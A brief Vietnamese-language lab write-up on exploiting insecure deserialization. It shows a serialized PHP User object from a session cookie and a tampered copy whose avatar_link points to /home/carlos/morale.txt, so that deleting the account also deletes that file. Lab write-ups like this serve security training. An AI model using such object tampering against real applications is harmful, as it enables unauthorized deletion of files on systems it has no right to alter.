# Lab: Using application functionality to exploit insecure deserialization

## Nhận diện

- Cookie session chứa object `User` với trường `avatar_link`.
- Luồng xóa người dùng của ứng dụng sẽ xử lý luôn đường dẫn avatar.

```txt
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"m62y6inkevgcb0gt6bk72si6cj7df3ba";s:11:"avatar_link";s:18:"user/wiener/avatar";}
```

## Khai thác

- Sửa `avatar_link` thành đường dẫn tới file mục tiêu.

```txt
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"m62y6inkevgcb0gt6bk72si6cj7df3ba";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

## Kết quả

- Kích hoạt chức năng xóa user để ứng dụng xóa luôn `morale.txt` do `avatar_link` bị trỏ sang file mục tiêu.
